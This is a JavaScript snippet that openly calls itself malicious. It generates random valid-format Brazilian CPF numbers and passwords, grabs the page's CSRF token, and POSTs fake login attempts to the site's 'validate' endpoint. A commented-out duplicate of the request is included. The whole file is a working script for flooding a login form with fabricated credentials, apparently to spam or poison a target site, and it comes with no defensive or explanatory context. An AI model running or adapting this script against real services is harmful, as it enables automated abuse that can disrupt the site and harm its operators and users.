async function doMaliciousStuff(href) {
    return new Promise((resolve, reject) => {
        const cpf = generateCpf();
        const password = generatePassword();
        const token = $('meta[name="csrf-token"]').attr("content");

        console.log(`Sending data. Token: ${token}. CPF: ${cpf}. Password: ${password}`);

        fetch(href.replace('login', 'validate'), {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-csrf-token": token,
                "x-requested-with": "XMLHttpRequest"
            },
            "referrer": href,
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": `action=doLogin&username=${cpf}&password=${password}&tipo=Pessoa+F%C3%ADsica`,
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        }).then(res => resolve(res)).catch(reject);
    });
}

function generatePassword() {
    return Math.floor(Math.random() * 10e7)
}

// https://pt.stackoverflow.com/a/244461
function generateCpf() {
    const num1 = aleatorio(); 
    const num2 = aleatorio();
    const num3 = aleatorio();

    const dig1 = dig(num1, num2, num3);
    const dig2 = dig(num1, num2, num3, dig1);

    return `${num1}${num2}${num3}${dig1}${dig2}`;
}

function dig(n1, n2, n3, n4) {

    let nums = n1.split("").concat(n2.split(""), n3.split(""));

    if (n4) {
        nums[9] = n4;
    }

    let x = 0;

    for (let i = (n4 ? 11 : 10), j = 0; i >= 2; i--, j++) {
        x += parseInt(nums[j]) * i;
    }

    const y = x % 11;
    return y < 2 ? 0 : 11 - y;
}

function aleatorio() {
    const aleat = Math.floor(Math.random() * 999);
    return ("" + aleat).padStart(3, '0');
}

// fetch(window.location.href.replace('login', 'validate'), {
//   "headers": {
//     "accept": "*/*",
//     "accept-language": "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7",
//     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
//     "sec-fetch-dest": "empty",
//     "sec-fetch-mode": "cors",
//     "sec-fetch-site": "same-origin",
//     "x-csrf-token": $('meta[name="csrf-token"]').attr("content"),
//     "x-requested-with": "XMLHttpRequest"
//   },
//   "referrer": window.location.href,
//   "referrerPolicy": "strict-origin-when-cross-origin",
//   "body": `action=doLogin&username=${gerarCpf()}&password=${generatePassword()}&tipo=Pessoa+F%C3%ADsica`,
//   "method": "POST",
//   "mode": "cors",
//   "credentials": "include"
// });